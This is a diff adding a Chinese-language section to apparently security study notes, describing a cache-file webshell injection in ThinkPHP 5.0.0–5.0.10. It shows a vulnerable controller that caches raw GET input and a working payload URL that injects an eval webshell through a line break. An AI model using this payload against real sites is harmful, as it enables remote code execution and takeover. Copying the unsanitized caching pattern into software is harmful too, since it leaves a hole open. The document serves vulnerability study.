@@ -258,3 +258,23 @@ config/app.php 中开启 app_debug 和 app_trace。
 ```
 
 
+
+^
+## **Tinkphp5缓存写马**
+该类会将缓存数据通过序列化的方式，直接存储在 **.php** 文件中，攻击者通过精心构造的 **payload** ，即可将 **webshell** 写入缓存文件。缓存文件的名字和目录均可预测出来，一旦缓存目录可访问或结合任意文件包含漏洞，即可触发 **远程代码执行漏洞** 。漏洞影响版本： **5.0.0<=ThinkPHP5<=5.0.10** 。
+```
+<?php
+namespace app\index\controller;
+use think\Cache;
+class Index
+{
+    public function index()
+    {
+        Cache::set("name",input("get.username"));
+        return 'Cache success';
+    }
+}
+```
+```
+/public/?username=mochazz123%0d%0a@eval($_GET[_]);//
+```
